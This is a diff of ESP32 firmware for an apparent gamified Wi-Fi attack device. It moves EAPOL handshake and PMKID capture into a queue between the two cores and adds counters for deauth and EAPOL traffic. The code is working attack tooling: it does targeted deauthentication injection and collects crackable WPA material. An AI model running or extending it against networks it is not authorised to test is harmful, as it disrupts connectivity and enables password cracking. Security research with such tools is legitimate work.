@@ -26,8 +26,10 @@
 #include <esp_heap_caps.h>
 #include <atomic>  // For atomic beaconCaptured flag
 
-// NOTE: Vector mutex moved to NetworkRecon - use NetworkRecon::enterCritical()/exitCritical()
-// This ensures all modes (OINK, DoNoHam, Spectrum) use the SAME mutex for the shared networks vector
+// NOTE: handshakes[]/pmkids[] vectors are Core 1 territory.
+// Callback (Core 0) is a PURE ENQUEUER — copies raw frame data to pool, no vector access.
+// Core 1 dequeue does all vector lookups and writes.
+// vectorMux (NetworkRecon::enterCritical()) ONLY used by Core 1 for networks[] access.
 
 // Simple flag to avoid concurrent access between promiscuous callback and main thread
 // NOTE: oinkBusy is now SECONDARY protection - spinlock is PRIMARY
@@ -81,43 +83,23 @@ static void onNewNetworkDiscovered(wifi_auth_mode_t authmode, bool isHidden,
     }
 }
 
-// Pending handshake/PMKID creation (callback queues, update() does push_back)
-// This avoids vector reallocation in callback context
-struct PendingHandshakeFrame {
+// Deferred EAPOL frame queue — Core 0 is PURE ENQUEUER, Core 1 does all vector access.
+// Single frame per slot (no batching) — callback just memcpy's raw data, no vector iteration.
+struct PendingEAPOLFrame {
     uint8_t bssid[6];
     uint8_t station[6];
-    uint8_t messageNum;        // DEPRECATED - used only for logging now
-    EAPOLFrame frames[4];      // Store all 4 EAPOL frames (M1-M4)
-    uint8_t capturedMask;      // Bitmask: bit0=M1, bit1=M2, bit2=M3, bit3=M4
-    uint8_t pmkid[16];         // If M1, may contain PMKID
+    uint8_t messageNum;         // 1-4
+    EAPOLFrame frame;           // single frame data
+    uint8_t pmkid[16];          // extracted from M1 (all-zero if none)
     bool hasPMKID;
 };
 
-// Circular buffer for pending handshake frames (4 slots to handle rapid EAPOL bursts)
-// STATIC POOL: Pre-allocated to avoid malloc in WiFi callback context (heap fragmentation risk)
-// WARNING: Each PendingHandshakeFrame is ~3.3KB (contains 4x EAPOLFrame @ 822 bytes each)
-// Total static pool: 4 * 3.3KB = ~13KB permanently in .bss - reduces heap even when idle!
 static const uint8_t PENDING_HS_SLOTS = 4;
-static PendingHandshakeFrame pendingHsPool[PENDING_HS_SLOTS];  // Static pool - no heap ops in callback
-// #region agent log
-// [DEBUG] H1: This static pool uses ~13KB of RAM - logged at compile time in .bss
-// Size info logged in init() below
-// #endregion
-static PendingHandshakeFrame* pendingHandshakes[PENDING_HS_SLOTS] = {nullptr, nullptr, nullptr, nullptr};
-static std::atomic<uint8_t> pendingHsWrite{0};
-static std::atomic<uint8_t> pendingHsRead{0};
-static std::atomic<bool> pendingHsBusy[PENDING_HS_SLOTS] = {
-    ATOMIC_VAR_INIT(false),
-    ATOMIC_VAR_INIT(false),
-    ATOMIC_VAR_INIT(false),
-    ATOMIC_VAR_INIT(false)
-};
-static std::atomic<bool> pendingHsAllocated[PENDING_HS_SLOTS] = {  // Track which pool slots are in use
-    ATOMIC_VAR_INIT(false),
-    ATOMIC_VAR_INIT(false),
-    ATOMIC_VAR_INIT(false),
-    ATOMIC_VAR_INIT(false)
-};
+static PendingEAPOLFrame pendingHsPool[PENDING_HS_SLOTS];
+static uint8_t pendingHsWrite = 0;
+static uint8_t pendingHsRead = 0;
+static bool pendingHsAllocated[PENDING_HS_SLOTS] = {false, false, false, false};
+static portMUX_TYPE oinkQueueMux = portMUX_INITIALIZER_UNLOCKED;
 
 struct PendingPMKIDCreate {
     uint8_t bssid[6];
@@ -190,6 +172,11 @@ uint8_t OinkMode::targetClientCount = 0;
 int OinkMode::selectionIndex = 0;
 std::atomic<uint32_t> OinkMode::packetCount{0};
 uint32_t OinkMode::deauthCount = 0;
+uint32_t OinkMode::deauthTxOk = 0;
+uint32_t OinkMode::deauthTxErrors = 0;
+uint32_t OinkMode::eapolRxCount = 0;
+uint32_t OinkMode::eapolRxNoKey = 0;
+uint32_t OinkMode::eapolRxNotTarget = 0;
 uint16_t OinkMode::filteredCount = 0;
 uint64_t OinkMode::filteredCache[64] = {0};
 uint8_t OinkMode::filteredCacheIndex = 0;
@@ -335,14 +322,14 @@ void OinkMode::init() {
     lastBoredUpdate = 0;
     boredStateReset = true;
 
-    // Reset static pool tracking (no heap ops - pool is pre-allocated)
+    // Reset static pool tracking under spinlock (callback may still be active briefly)
+    taskENTER_CRITICAL(&oinkQueueMux);
     for (int i = 0; i < PENDING_HS_SLOTS; i++) {
-        pendingHandshakes[i] = nullptr;
-        pendingHsBusy[i] = false;
         pendingHsAllocated[i] = false;
     }
     pendingHsWrite = 0;
     pendingHsRead = 0;
+    taskEXIT_CRITICAL(&oinkQueueMux);
     pendingPmkidWrite = 0;
     pendingPmkidRead = 0;
 
@@ -372,6 +359,11 @@ void OinkMode::init() {
     selectionIndex = 0;
     packetCount.store(0, std::memory_order_relaxed);
     deauthCount = 0;
+    deauthTxOk = 0;
+    deauthTxErrors = 0;
+    eapolRxCount = 0;
+    eapolRxNoKey = 0;
+    eapolRxNotTarget = 0;
     currentHopIndex = 0;
     
     // Reset state machine
@@ -399,6 +391,12 @@ void OinkMode::start() {
     
     Serial.printf("[OINK] Starting... free=%u\r\n", ESP.getFreeHeap());
     
+    // Register our packet callback BEFORE starting NetworkRecon — prevents a
+    // TG1WDT race window where promiscuous is active but modeCallback is null,
+    // causing NetworkRecon's own beacon processing to call enterCritical()
+    // (= taskENTER_CRITICAL(&vectorMux)) from Core 0.
+    NetworkRecon::setPacketCallback(promiscuousCallback);
+    
     // Ensure NetworkRecon is running (handles WiFi promiscuous mode)
     if (!NetworkRecon::isRunning()) {
         NetworkRecon::start();
@@ -406,11 +404,6 @@ void OinkMode::start() {
     
     // Initialize WSL bypasser for deauth frame injection
     WSLBypasser::init();
-    
-    // Register our packet callback for EAPOL/handshake capture
-    NetworkRecon::setPacketCallback(promiscuousCallback);
-    
-    // Register callback for new network discovery (triggers XP events)
     NetworkRecon::setNewNetworkCallback(onNewNetworkDiscovered);
     
     running = true;
@@ -479,14 +472,14 @@ void OinkMode::stop() {
     pmkids.clear();
     pmkids.shrink_to_fit();
     
-    // Reset static pool tracking (no heap ops - pool is pre-allocated)
+    // Reset static pool tracking under spinlock
+    taskENTER_CRITICAL(&oinkQueueMux);
     for (int i = 0; i < PENDING_HS_SLOTS; i++) {
-        pendingHandshakes[i] = nullptr;
-        pendingHsBusy[i] = false;
         pendingHsAllocated[i] = false;
     }
     pendingHsWrite = 0;
     pendingHsRead = 0;
+    taskEXIT_CRITICAL(&oinkQueueMux);
     pendingPmkidWrite = 0;
     pendingPmkidRead = 0;
 
@@ -514,11 +507,12 @@ void OinkMode::update() {
     // OINK no longer needs to process pendingNetworkAdd - this was dead code after the refactor.
     
     // Process pending mood: new network discovered
+    // No spinlock needed: oinkBusy=true already prevents callback from writing.
+    // CYD pattern: volatile flags are single-writer (callback) / single-reader (update).
     char pendingSSIDCopy[33] = {0};
     int8_t pendingRSSICopy = 0;
     uint8_t pendingChannelCopy = 0;
     bool hasPendingNewNetwork = false;
-    NetworkRecon::enterCritical();
     if (pendingNewNetwork) {
         strncpy(pendingSSIDCopy, pendingNetworkSSID, 32);
         pendingSSIDCopy[32] = 0;
@@ -527,7 +521,6 @@ void OinkMode::update() {
         pendingNewNetwork = false;
         hasPendingNewNetwork = true;
     }
-    NetworkRecon::exitCritical();
     if (hasPendingNewNetwork) {
         Mood::onNewNetwork(pendingSSIDCopy, pendingRSSICopy, pendingChannelCopy);
     }
@@ -535,13 +528,11 @@ void OinkMode::update() {
     // Process pending mood: deauth success
     uint8_t pendingStationCopy[6] = {0};
     bool hasPendingDeauth = false;
-    NetworkRecon::enterCritical();
     if (pendingDeauthSuccess) {
         memcpy(pendingStationCopy, pendingDeauthStation, sizeof(pendingStationCopy));
         pendingDeauthSuccess = false;
         hasPendingDeauth = true;
     }
-    NetworkRecon::exitCritical();
     if (hasPendingDeauth) {
         Mood::onDeauthSuccess(pendingStationCopy);
     }
@@ -549,32 +540,29 @@ void OinkMode::update() {
     // Process pending mood: handshake complete
     char pendingHandshakeCopy[33] = {0};
     bool hasPendingHandshakeDone = false;
-    NetworkRecon::enterCritical();
     if (pendingHandshakeComplete) {
         strncpy(pendingHandshakeCopy, pendingHandshakeSSID, 32);
         pendingHandshakeCopy[32] = 0;
         pendingHandshakeComplete = false;
         hasPendingHandshakeDone = true;
     }
-    NetworkRecon::exitCritical();
     if (hasPendingHandshakeDone) {
         Mood::onHandshakeCaptured(pendingHandshakeCopy);
         strncpy(lastPwnedSSID, pendingHandshakeCopy, sizeof(lastPwnedSSID) - 1);
         lastPwnedSSID[sizeof(lastPwnedSSID) - 1] = '\0';
         Display::showLoot(lastPwnedSSID);  // Show PWNED banner in top bar
+        Serial.write('M');  // DIAG: mood+display done
     }
     
     // Process pending mood: PMKID captured (clientless attack - extra special!)
     char pendingPMKIDCopy[33] = {0};
     bool hasPendingPMKID = false;
-    NetworkRecon::enterCritical();
     if (pendingPMKIDCapture) {
         strncpy(pendingPMKIDCopy, pendingPMKIDSSID, 32);
         pendingPMKIDCopy[32] = 0;
         pendingPMKIDCapture = false;
         hasPendingPMKID = true;
     }
-    NetworkRecon::exitCritical();
     if (hasPendingPMKID) {
         Mood::onPMKIDCaptured(pendingPMKIDCopy);
         strncpy(lastPwnedSSID, pendingPMKIDCopy, sizeof(lastPwnedSSID) - 1);
@@ -588,65 +576,71 @@ void OinkMode::update() {
     
     // Process pending auto-save (callback set flag, we do SD I/O here)
     bool shouldAutoSave = false;
-    NetworkRecon::enterCritical();
     if (pendingAutoSave) {
         pendingAutoSave = false;
         shouldAutoSave = true;
     }
-    NetworkRecon::exitCritical();
     if (shouldAutoSave) {
         autoSaveCheck();
+        Serial.write('A');  // DIAG: autoSave done
     }
     
-    // Process pending handshake creation from circular buffer (callback queued, we do push_back here)
-    while (pendingHsRead != pendingHsWrite) {
-        // Get slot from circular buffer
-        uint8_t slot = pendingHsRead;
-        if (pendingHsBusy[slot] || !pendingHandshakes[slot]) {
-            break;  // Slot still being written by callback or not allocated, wait for next cycle
+    // Process pending EAPOL frames from circular buffer
+    // Core 0 was a PURE ENQUEUER — just memcpy'd raw frame data to pendingHsPool.
+    // Core 1 (here) does ALL vector access: find/create handshake, store frame, check completion.
+    // Copy slot under oinkQueueMux, free immediately, process outside lock.
+    static PendingEAPOLFrame frameLocal;
+    while (true) {
+        bool hasSlot = false;
+        taskENTER_CRITICAL(&oinkQueueMux);
+        if (pendingHsRead != pendingHsWrite && pendingHsAllocated[pendingHsRead]) {
+            memcpy(&frameLocal, &pendingHsPool[pendingHsRead], sizeof(PendingEAPOLFrame));
+            pendingHsAllocated[pendingHsRead] = false;
+            pendingHsRead = (pendingHsRead + 1) % PENDING_HS_SLOTS;
+            hasSlot = true;
         }
+        taskEXIT_CRITICAL(&oinkQueueMux);
         
-        // Create or find handshake entry in main thread context
-        int idx = findOrCreateHandshakeSafe(pendingHandshakes[slot]->bssid, pendingHandshakes[slot]->station);
+        if (!hasSlot) break;
+        
+        // Core 1: find or create handshake entry (push_back on vector)
+        int idx = findOrCreateHandshakeSafe(frameLocal.bssid, frameLocal.station);
         if (idx >= 0) {
             CapturedHandshake& hs = handshakes[idx];
             
-            // Process ALL queued frames (M1-M4) from capturedMask
-            for (int msgIdx = 0; msgIdx < 4; msgIdx++) {
-                if (pendingHandshakes[slot]->capturedMask & (1 << msgIdx)) {
-                    // Frame is present in the queued data
-                    if (hs.frames[msgIdx].len == 0) {  // Not already captured
-                        uint16_t copyLen = pendingHandshakes[slot]->frames[msgIdx].len;
-                        if (copyLen > 0 && copyLen <= 512) {
-                            // EAPOL payload
-                            memcpy(hs.frames[msgIdx].data, pendingHandshakes[slot]->frames[msgIdx].data, copyLen);
-                            hs.frames[msgIdx].len = copyLen;
-                            hs.frames[msgIdx].messageNum = msgIdx + 1;
-                            hs.frames[msgIdx].timestamp = millis();
-                            
-                            // Full 802.11 frame for PCAP
-                            uint16_t fullLen = pendingHandshakes[slot]->frames[msgIdx].fullFrameLen;
-                            if (fullLen > 0 && fullLen <= 300) {
-                                memcpy(hs.frames[msgIdx].fullFrame, pendingHandshakes[slot]->frames[msgIdx].fullFrame, fullLen);
-                                hs.frames[msgIdx].fullFrameLen = fullLen;
-                                hs.frames[msgIdx].rssi = pendingHandshakes[slot]->frames[msgIdx].rssi;
-                            }
-                            
-                            hs.capturedMask |= (1 << msgIdx);
-                            hs.lastSeen = millis();
-                        }
+            // Store this single frame
+            uint8_t msgIdx = frameLocal.messageNum - 1;
+            if (msgIdx < 4 && hs.frames[msgIdx].len == 0) {
+                uint16_t copyLen = frameLocal.frame.len;
+                if (copyLen > 0 && copyLen <= 512) {
+                    memcpy(hs.frames[msgIdx].data, frameLocal.frame.data, copyLen);
+                    hs.frames[msgIdx].len = copyLen;
+                    hs.frames[msgIdx].messageNum = msgIdx + 1;
+                    hs.frames[msgIdx].timestamp = millis();
+                    
+                    // Full 802.11 frame for PCAP
+                    uint16_t fullLen = frameLocal.frame.fullFrameLen;
+                    if (fullLen > 0 && fullLen <= 300) {
+                        memcpy(hs.frames[msgIdx].fullFrame, frameLocal.frame.fullFrame, fullLen);
+                        hs.frames[msgIdx].fullFrameLen = fullLen;
+                        hs.frames[msgIdx].rssi = frameLocal.frame.rssi;
                     }
+                    
+                    hs.capturedMask |= (1 << msgIdx);
+                    hs.lastSeen = millis();
                 }
             }
             
-            // Get SSID for this BSSID
+            // SSID lookup from networks (Core 1, safe with vectorMux)
+            NetworkRecon::enterCritical();
             for (const auto& net : networks()) {
-                if (memcmp(net.bssid, pendingHandshakes[slot]->bssid, 6) == 0) {
+                if (memcmp(net.bssid, frameLocal.bssid, 6) == 0) {
                     strncpy(hs.ssid, net.ssid, 32);
                     hs.ssid[32] = 0;
                     break;
                 }
             }
+            NetworkRecon::exitCritical();
             
             // Check if handshake is now complete
             if (hs.isComplete() && !hs.saved) {
@@ -655,31 +649,36 @@ void OinkMode::update() {
                 pendingHandshakeSSID[32] = 0;
                 WarhogMode::markCaptured(hs.bssid);
                 
-                // Auto-save complete handshake (safe here - main thread context)
+                NetworkRecon::enterCritical();
+                for (auto& net : networks()) {
+                    if (memcmp(net.bssid, hs.bssid, 6) == 0) {
+                        net.hasHandshake = true;
+                        break;
+                    }
+                }
+                NetworkRecon::exitCritical();
+                
                 autoSaveCheck();
             }
             
             // Handle PMKID from M1 if present
-            if (pendingHandshakes[slot]->hasPMKID) {
-                int pIdx = findOrCreatePMKIDSafe(pendingHandshakes[slot]->bssid, pendingHandshakes[slot]->station);
+            if (frameLocal.hasPMKID) {
+                int pIdx = findOrCreatePMKIDSafe(frameLocal.bssid, frameLocal.station);
                 if (pIdx >= 0 && !pmkids[pIdx].saved) {
-                    memcpy(pmkids[pIdx].pmkid, pendingHandshakes[slot]->pmkid, 16);
-                    // Get SSID
+                    memcpy(pmkids[pIdx].pmkid, frameLocal.pmkid, 16);
+                    pmkids[pIdx].timestamp = millis();
+                    NetworkRecon::enterCritical();
                     for (const auto& net : networks()) {
-                        if (memcmp(net.bssid, pendingHandshakes[slot]->bssid, 6) == 0) {
+                        if (memcmp(net.bssid, frameLocal.bssid, 6) == 0) {
                             strncpy(pmkids[pIdx].ssid, net.ssid, 32);
                             pmkids[pIdx].ssid[32] = 0;
                             break;
                         }
                     }
+                    NetworkRecon::exitCritical();
                 }
             }
         }
-        
-        // Release slot back to static pool (no heap ops), advance read pointer
-        pendingHandshakes[slot] = nullptr;
-        pendingHsAllocated[slot] = false;
-        pendingHsRead = (pendingHsRead + 1) % PENDING_HS_SLOTS;
     }
     
     // Process pending PMKID creation (callback queued, we do push_back here)
@@ -719,6 +718,9 @@ void OinkMode::update() {
     // Free beacon data from saved handshakes to reclaim heap
     static uint32_t lastBeaconAudit = 0;
     if (now - lastBeaconAudit > 10000) {
+        // Hold oinkBusy to prevent callback from accessing handshakes[] during free
+        const bool wasBusyAudit = oinkBusy;
+        oinkBusy = true;
         for (auto& hs : handshakes) {
             if (hs.saved && hs.beaconData) {
                 free(hs.beaconData);
@@ -726,6 +728,7 @@ void OinkMode::update() {
                 hs.beaconLen = 0;
             }
         }
+        oinkBusy = wasBusyAudit;
         lastBeaconAudit = now;
     }
     
@@ -913,10 +916,6 @@ void OinkMode::update() {
                 deauthing = false;  // Don't deauth yet, just listen
                 channelHopping = false;  // Ensure channel stays locked during capture phase
                 
-                // #region agent log - H1/H2 state transition to LOCKING
-                Serial.printf("[DBG-H1H2] ->LOCKING target=%s ch=%d PMF=%d reconLocked=%d\r\n", networks()[selectionIndex].ssid, networks()[selectionIndex].channel, networks()[selectionIndex].hasPMF ? 1 : 0, NetworkRecon::isChannelLocked() ? 1 : 0);
-                // #endregion
-                
                 Mood::setStatusMessage("sniffin clients");
                 Avatar::sniff();  // Nose twitch when sniffing for auths
             }
@@ -924,15 +923,6 @@ void OinkMode::update() {
             
         case AutoState::LOCKING:
             {
-            // #region agent log - H1/H2 channel during LOCKING
-            {
-                static uint32_t lastLockLog = 0;
-                if (now - lastLockLog > 500) {
-                    lastLockLog = now;
-                    Serial.printf("[DBG-H1H2] LOCKING oinkCh=%d reconCh=%d locked=%d tgtIdx=%d\r\n", currentChannel, NetworkRecon::getCurrentChannel(), NetworkRecon::isChannelLocked() ? 1 : 0, targetIndex);
-                }
-            }
-            // #endregion
             // Wait on target channel to discover clients via data frames
             // This is crucial - targeted deauth is much more effective
             if (targetIndex < 0) {
@@ -973,8 +963,24 @@ void OinkMode::update() {
             targetIndex = foundIdx;
             {
                 uint32_t lockElapsed = now - stateStartTime;
-                bool hasRecentClient = (targetCopy.lastDataSeen > 0) &&
-                    (now - targetCopy.lastDataSeen) <= CLIENT_RECENT_MS;
+                
+                // Use OinkMode's own client tracking from promiscuous callback.
+                // NetworkRecon's lastDataSeen is stale because OINK overrides its
+                // promiscuous callback — NetworkRecon never sees data frames.
+                bool hasRecentClient = false;
+                {
+                    const bool wasBusy = oinkBusy;
+                    oinkBusy = true;
+                    if (targetClientCount > 0) {
+                        for (uint8_t c = 0; c < targetClientCount; c++) {
+                            if (now - targetClients[c].lastSeen <= CLIENT_RECENT_MS) {
+                                hasRecentClient = true;
+                                break;
+                            }
+                        }
+                    }
+                    oinkBusy = wasBusy;
+                }
 
                 if (!hasRecentClient && lockElapsed >= LOCK_EARLY_EXIT_MS) {
                     autoState = AutoState::NEXT_TARGET;
@@ -1000,9 +1006,6 @@ void OinkMode::update() {
                     attackStartTime = now;
                     deauthCount = 0;
                     deauthing = true;
-                    // #region agent log - H6 state to ATTACKING
-                    Serial.printf("[DBG-H6] ->ATTACKING after lock timeout\r\n");
-                    // #endregion
                 }
             }
             break;
@@ -1067,19 +1070,22 @@ void OinkMode::update() {
                     }
                     
                     uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
-                    
+
+                    // Skip channel verification if NetworkRecon is paused (WiFi state unstable during pause/resume)
+                    if (!NetworkRecon::isPaused()) {
+                        uint8_t actualCh = 0;
+                        wifi_second_chan_t secondCh = WIFI_SECOND_CHAN_NONE;
+                        esp_wifi_get_channel(&actualCh, &secondCh);
+                        if (actualCh != currentChannel && actualCh != 0) {
+                            Serial.printf("[OINK] CH MISMATCH! oinkCh=%d actualCh=%d — re-locking\r\n", currentChannel, (int)actualCh);
+                            setChannel(currentChannel);
+                        }
+                    }
                     // PRIORITY 1: Target specific clients (MOST EFFECTIVE)
                     // Targeted deauth is much more reliable than broadcast
                     if (clientCountLocal > 0) {
                         // Get buff-modified burst count (base 5, buffed up to 8, debuffed down to 3)
                         uint8_t burstCount = SwineStats::getDeauthBurstCount();
-                        // #region agent log - H6 deauth send
-                        static uint32_t lastDeauthLog = 0;
-                        if (now - lastDeauthLog > 1000) {
-                            lastDeauthLog = now;
-                            Serial.printf("[DBG-H6] DEAUTH clients=%d burst=%d total=%lu\r\n", clientCountLocal, burstCount, deauthCount);
-                        }
-                        // #endregion
                         // CRITICAL FIX: Limit clients per cycle to prevent WDT reset
                         // With 20 clients × burst delays, blocking time could exceed 1.5s
                         // Process max 4 clients per cycle, rotate through on next cycles
@@ -1463,9 +1469,6 @@ void OinkMode::stopDeauth() {
 void OinkMode::setChannel(uint8_t ch) {
     if (ch < 1 || ch > 14) return;
     currentChannel = ch;
-    // #region agent log - H1/H2 channel conflict
-    Serial.printf("[DBG-H1H2] OINK setCh=%d reconCh=%d reconLocked=%d\r\n", ch, NetworkRecon::getCurrentChannel(), NetworkRecon::isChannelLocked() ? 1 : 0);
-    // #endregion
     // Use NetworkRecon's channel lock to prevent hopping during target lock
     NetworkRecon::lockChannel(ch);
 }
@@ -1502,19 +1505,6 @@ void OinkMode::promiscuousCallback(const wifi_promiscuous_pkt_t* pkt, wifi_promi
     if (len < 24) return;
 
     packetCount.fetch_add(1, std::memory_order_relaxed);
-    
-    // #region agent log - H5 callback firing
-    {
-        static uint32_t lastCbLog = 0;
-        static uint32_t cbCount = 0;
-        cbCount++;
-        uint32_t now = millis();
-        if (now - lastCbLog > 3000) {
-            lastCbLog = now;
-            Serial.printf("[DBG-H5] OINK callback count=%lu type=%d\r\n", cbCount, (int)type);
-        }
-    }
-    // #endregion
     
     const uint8_t* payload = pkt->payload;
     uint8_t frameSubtype = (payload[0] >> 4) & 0x0F;
@@ -1561,16 +1551,13 @@ void OinkMode::processBeacon(const uint8_t* payload, uint16_t len, int8_t rssi) 
         }
     }
     
-    // Update hasHandshake flag in shared network data
-    int idx = findNetwork(bssid);
-    if (idx >= 0) {
-        NetworkRecon::enterCritical();
-        auto& nets = NetworkRecon::getNetworks();
-        if (idx < (int)nets.size()) {
-            nets[idx].hasHandshake = hasHandshakeFor(bssid);
-        }
-        NetworkRecon::exitCritical();
-    }
+    // hasHandshake flag update REMOVED from per-beacon callback path.
+    // Previously: enterCritical + iterate networks × handshakes on EVERY beacon.
+    // With 22+ APs, this spinlock ran hundreds of times/sec on core 0,
+    // starving the idle task watchdog → TG1WDT_SYS_RST.
+    // Now: hasHandshake is set at capture time in ATTACKING state handler
+    // (line ~1138) and in processDeferredHandshakes — main thread context,
+    // no interrupt-path overhead. CYD port confirmed: no per-beacon spinlock.
 }
 
 // Note: Legacy processBeacon network discovery code removed
@@ -1693,7 +1680,7 @@ void OinkMode::processDataFrame(const uint8_t* payload, uint16_t len, int8_t rss
         payload[offset+4] == 0x00 && payload[offset+5] == 0x00 &&
         payload[offset+6] == 0x88 && payload[offset+7] == 0x8E) {
         
-        // This is EAPOL!
+        eapolRxCount++;
         const uint8_t* srcMac = payload + 10;  // TA
         const uint8_t* dstMac = payload + 4;   // RA
         
@@ -1704,14 +1691,24 @@ void OinkMode::processDataFrame(const uint8_t* payload, uint16_t len, int8_t rss
 void OinkMode::processEAPOL(const uint8_t* payload, uint16_t len, 
                              const uint8_t* srcMac, const uint8_t* dstMac,
                              const uint8_t* fullFrame, uint16_t fullFrameLen, int8_t rssi) {
+    // =========================================================================
+    // CORE 0 SAFETY RULES — DO NOT VIOLATE:
+    //   1. NEVER call NetworkRecon::enterCritical() (= taskENTER_CRITICAL(&vectorMux))
+    //      Core 1 holds vectorMux during update(). If Core 0 tries to acquire it
+    //      while Core 1 holds it, Core 0 spins with interrupts OFF → TG1WDT_SYS_RST.
+    //   2. NEVER iterate handshakes[] or pmkids[] — Core 1 may push_back() concurrently.
+    //   3. ONLY use oinkQueueMux, and ONLY for short memcpy operations.
+    //      Core 1 must NOT hold oinkQueueMux for long (it releases immediately after copy).
+    // =========================================================================
+    
     if (len < 4) return;
     
     // EAPOL: version(1) + type(1) + length(2) + descriptor(...)
     uint8_t type = payload[1];
     
-    if (type != 3) return;  // Only interested in EAPOL-Key
+    if (type != 3) { eapolRxNoKey++; return; }
     
-    if (len < 99) return;  // Minimum EAPOL-Key frame
+    if (len < 99) { eapolRxNoKey++; return; }
     
     // Key info at offset 5-6
     uint16_t keyInfo = (payload[5] << 8) | payload[6];
@@ -1722,11 +1719,11 @@ void OinkMode::processEAPOL(const uint8_t* payload, uint16_t len,
     
     uint8_t messageNum = 0;
     if (keyAck && !keyMic) messageNum = 1;
-    else if (!keyAck && keyMic && !secure) messageNum = 2;  // M2: has MIC, not secure (M4 is secure)
+    else if (!keyAck && keyMic && !secure) messageNum = 2;
     else if (keyAck && keyMic && install) messageNum = 3;
     else if (!keyAck && keyMic && secure) messageNum = 4;
     
-    if (messageNum == 0) return;
+    if (messageNum == 0) { eapolRxNoKey++; return; }
     
     // Determine which is AP (sender of M1/M3) and station
     uint8_t bssid[6], station[6];
@@ -1739,326 +1736,111 @@ void OinkMode::processEAPOL(const uint8_t* payload, uint16_t len,
     }
     
     // M1 = AP initiating handshake = client reconnected after deauth!
-    // If we're deauthing this target, our deauth worked!
-    // Use BSSID match instead of targetIndex for cross-core safety (callback runs on core 1,
-    // targetIndex can become stale after cleanupStaleNetworks shifts indices on core 0)
     if (messageNum == 1 && deauthing && targetBssid[0] != 0) {
         if (memcmp(bssid, targetBssid, 6) == 0) {
-            // DEFERRED: Queue deauth success for main thread
             if (!pendingDeauthSuccess) {
                 memcpy(pendingDeauthStation, station, 6);
                 pendingDeauthSuccess = true;
             }
+        } else {
+            eapolRxNotTarget++;
         }
     }
     
-    // ========== PMKID EXTRACTION FROM M1 ==========
-    // PMKID is in Key Data field of M1 when AP supports it (WPA2/WPA3 only)
-    // EAPOL-Key frame: descriptor_type(1) @ offset 4, key_data_length(2) @ offset 97-98, key_data @ offset 99
-    // Key Data contains RSN IE with PMKID: dd 14 00 0f ac 04 [16-byte PMKID]
-    // Only RSN (descriptor type 0x02) has PMKID - WPA1 (0xFE) does not
+    // ========== PURE ENQUEUER: Core 0 NEVER touches handshakes[] or pmkids[] ==========
+    // Extract PMKID from M1 payload (packet parsing only, no vector access)
+    bool hasPMKID = false;
+    uint8_t pmkidBuf[16] = {0};
     uint8_t descriptorType = payload[4];
-    if (messageNum == 1 && descriptorType == 0x02 && len >= 121) {  // RSN + 99 + 22 bytes minimum
+    if (messageNum == 1 && descriptorType == 0x02 && len >= 121) {
         uint16_t keyDataLen = (payload[97] << 8) | payload[98];
-        
-        // PMKID Key Data is exactly 22 bytes: dd(1) + len(1) + OUI(3) + type(1) + PMKID(16)
         if (keyDataLen >= 22 && len >= 99 + keyDataLen) {
             const uint8_t* keyData = payload + 99;
-            
-            // Look for PMKID KDE: dd 14 00 0f ac 04 (vendor IE, IEEE OUI, PMKID type)
-            // Can appear at start or within Key Data
-            for (uint16_t i = 0; i + 22 < keyDataLen; i++) {  // Strict < ensures 22 bytes remain
+            for (uint16_t i = 0; i + 22 < keyDataLen; i++) {
                 if (keyData[i] == 0xdd && keyData[i+1] == 0x14 &&
                     keyData[i+2] == 0x00 && keyData[i+3] == 0x0f &&
                     keyData[i+4] == 0xac && keyData[i+5] == 0x04) {
-                    
-                    // Double-check we have 22 bytes: tag(1) + len(1) + OUI(3) + type(1) + PMKID(16)
-                    if (i + 22 > keyDataLen) break;  // Defensive bounds check
-                    
-                    // Found PMKID KDE! Extract the 16 bytes
+                    if (i + 22 > keyDataLen) break;
                     const uint8_t* pmkidData = keyData + i + 6;
-                    
-                    // Check if PMKID is all zeros (some APs send empty PMKID KDE)
                     bool allZeros = true;
                     for (int z = 0; z < 16; z++) {
                         if (pmkidData[z] != 0) { allZeros = false; break; }
                     }
-                    if (allZeros) {
-                        break;  // Skip invalid PMKID
-                    }
-                    
-                    // Check if we already have this PMKID (lookup only - no push_back)
-                    int pmkIdx = findOrCreatePMKID(bssid, station);
-                    if (pmkIdx >= 0) {
-                        // Protect PMKID vector access with spinlock
-                        NetworkRecon::enterCritical();
-                        
-                        // Revalidate index
-                        if (pmkIdx >= (int)pmkids.size() || pmkids[pmkIdx].saved) {
-                            NetworkRecon::exitCritical();
-                            break;
-                        }
-                        
-                        CapturedPMKID& p = pmkids[pmkIdx];
-                        memcpy(p.pmkid, pmkidData, 16);
-                        p.timestamp = millis();
-                        
-                        // Look up SSID (already holding lock)
-                        if (p.ssid[0] == 0) {
-                            for (int ni = 0; ni < (int)networks().size(); ni++) {
-                                if (memcmp(networks()[ni].bssid, bssid, 6) == 0) {
-                                    strncpy(p.ssid, networks()[ni].ssid, 32);
-                                    p.ssid[32] = 0;
-                                    break;
-                                }
-                            }
-                        }
-                        
-                        char ssidCopy[33] = {0};
-                        strncpy(ssidCopy, p.ssid, 32);
-                        NetworkRecon::exitCritical();
-                        
-                        // Queue mood event outside critical section
-                        if (!pendingPMKIDCapture) {
-                            strncpy(pendingPMKIDSSID, ssidCopy, 32);
-                            pendingPMKIDSSID[32] = 0;
-                            pendingPMKIDCapture = true;
-                        }
-                    } else if (pmkIdx < 0) {
-                        // New PMKID - queue for creation in main thread
-                        // Get SSID from networks if available (with spinlock)
-                        char ssidBuf[33] = {0};
-                        NetworkRecon::enterCritical();
-                        for (int ni = 0; ni < (int)networks().size(); ni++) {
-                            if (memcmp(networks()[ni].bssid, bssid, 6) == 0) {
-                                strncpy(ssidBuf, networks()[ni].ssid, 32);
-                                ssidBuf[32] = 0;
-                                break;
-                            }
-                        }
-                        NetworkRecon::exitCritical();
-
-                        if (enqueuePendingPMKID(bssid, station, pmkidData, ssidBuf)) {
-                            // Trigger auto-save for PMKID (with backfill retry)
-                            pendingAutoSave = true;
-
-                            // Queue the mood event
-                            if (!pendingPMKIDCapture) {
-                                strncpy(pendingPMKIDSSID, ssidBuf, 32);
-                                pendingPMKIDSSID[32] = 0;
-                                pendingPMKIDCapture = true;
-                            }
-                        }
-                    }
-                    break;  // Found it, stop searching
-                }
-            }
-        }
-    }
-    
-    // Find or create handshake entry (lookup only - no push_back)
-    int hsIdx = findOrCreateHandshake(bssid, station);
-    
-    if (hsIdx >= 0) {
-        // Protect handshake vector access with spinlock
-        NetworkRecon::enterCritical();
-        
-        // Revalidate index after acquiring lock
